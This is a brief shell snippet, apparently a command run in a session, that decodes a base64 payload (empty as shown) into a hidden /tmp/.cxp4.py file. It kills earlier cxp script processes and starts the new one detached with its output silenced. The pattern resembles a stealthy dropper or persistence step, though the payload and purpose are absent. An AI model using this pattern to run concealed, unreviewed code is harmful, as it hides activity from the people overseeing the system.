echo  | base64 -d > /tmp/.cxp4.py
for pid in $(ls /proc | grep -E '^[0-9]+$'); do cl=$(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null); case "$cl" in *cxp.py*|*cxp2.py*|*cxp3.py*) kill -9 $pid 2>/dev/null;; esac; done
rm -f /tmp/.cxp4.lock
(setsid nohup python3 /tmp/.cxp4.py >/dev/null 2>&1 &)
sleep 3; echo STARTED; ls -la /tmp/.cxp4.py /tmp/.cxp4.lock 2>&1
